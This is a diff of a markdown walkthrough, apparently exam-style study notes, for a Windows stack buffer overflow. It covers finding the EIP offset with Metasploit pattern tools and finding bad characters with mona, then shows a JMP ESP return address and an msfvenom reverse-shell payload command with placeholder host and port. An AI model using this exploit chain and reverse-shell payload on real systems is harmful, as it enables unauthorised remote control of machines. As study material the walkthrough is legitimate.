@@ -35,10 +35,11 @@ for string in buffer:
         print("Could not connect to " + IP + ":" + str(PORT))
         sys.exit(0)
     time.sleep(1)
-    ```
+ ```
     
-    Once the application has been crashed. It is time to overwrite and take control of the EIP pointer. To do this I will create a unique pattern using
-    msf-pattern-create, using the greatest size of bytes used to crash the application via the fuzzer.
+   
+   Once the application has been crashed. It is time to overwrite and take control of the EIP pointer. To do this I will create a unique pattern using
+   msf-pattern-create, using the greatest size of bytes used to crash the application via the fuzzer.
 
 Create a working directory for !mona
 ```    
@@ -47,11 +48,15 @@ Create a working directory for !mona
 
 Create a pattern to overwrite
 
-```msf-pattern_create -l <i.e 2560 or 0xA00>```
+```
+msf-pattern_create -l <i.e 2560 or 0xA00>
+```
 
 Find the offset
 
-```msf-pattern_offset -l <i.e 2560 or 0xA00> -q <i.e 33794332>```
+```
+msf-pattern_offset -l <i.e 2560 or 0xA00> -q <i.e 33794332>
+```
 
 Once the offset has been found. In this case 2288, over the original 2560.
 
@@ -63,7 +68,7 @@ buffer = 'C' * 0x616 #268    This is for Shellcode ;~)
 
 This should equal 2560 as the original size of the pattern created. 
 
-To test this
+To test this I have created the exploit, working primarily into this file as I go forward.
 
 exploit.py 
 ```
@@ -100,17 +105,18 @@ except:
 	print "No Connection --------"
 	sys.exit()
   ```
-Run check.py, EIP should be equal to 42424242 (hex value of “BBBB”). I now control EIP!
+Running exploit.py, EIP should now be equal to 42424242 (hex value of “BBBB”). I now control EIP!
 
 Now that EIP has been controlled, it is critical to gather a list of bad characters, when the shellcode is generated any invalid characters could
 stop the payload from being read through the application. 
 
-Finding bad characters with !mona. .\x00 is always considered a bad character as it will truncate shellcode when executed.
+Finding bad characters with !mona. '\x00' is always considered a bad character as it will truncate shellcode when executed.
 
-Creating a list of badchars
+Creating a list of badchars using !mona
 ```
 !mona bytearray -b "\x00"
-``` This will exclude the bad characters
+``` 
+This will exclude the bad characters
 ```
 !mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
 ``` 
@@ -138,18 +144,17 @@ Choose an address in the results and update exploit.py :
 Setting the retn variable to the address, written backward (little-endian)
 
 ```
-# Example of a JMP ESP address
+JMP ESP address
 
 0x625011af
 
 # exploit.py
-retn
 eip = "\xaf\x11\x50\x62"
 ```
 
 Generate the shellcode 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> –e x86/shikata_ga_nai -b "<BAD_CHARS>" -f c
 ```
 
 Prepend NOPs
@@ -184,7 +189,7 @@ try:
   buffer = 'C' * 0x616 #268  
   padding = "\x90" * 16
   
-  ## Generate Shellcode Command: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
+  ## Generate Shellcode Command: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> –e x86/shikata_ga_nai -b "<BAD_CHARS>" -f c
   ## Bad Charecters: 
   
   shellcode = 
